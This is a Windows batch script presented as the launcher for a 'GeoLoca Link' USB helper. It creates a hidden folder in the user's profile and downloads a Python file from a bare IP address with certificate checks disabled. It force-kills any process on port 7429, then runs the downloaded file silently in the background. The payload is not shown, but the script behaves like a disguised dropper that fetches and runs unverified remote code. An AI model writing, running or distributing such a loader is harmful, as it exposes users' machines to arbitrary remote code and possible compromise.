@echo off
setlocal
set "DIR=%USERPROFILE%\.geoloca"
set "SITE=https://109.71.252.128"
if not exist "%DIR%" mkdir "%DIR%"

if exist "%~dp0usb_helper.py" (
  copy /Y "%~dp0usb_helper.py" "%DIR%\usb_helper.py" >nul
) else if not exist "%DIR%\usb_helper.py" (
  curl -fsSLk "%SITE%/connect/usb_helper.py" -o "%DIR%\usb_helper.py"
)

for /f "tokens=5" %%a in ('netstat -aon ^| findstr :7429 ^| findstr LISTENING') do taskkill /F /PID %%a >nul 2>&1
start /B pythonw "%DIR%\usb_helper.py"
timeout /t 2 /nobreak >nul
start "" "%SITE%/dashboard"
echo GeoLoca Link is running. Return to the dashboard in your browser.
pause
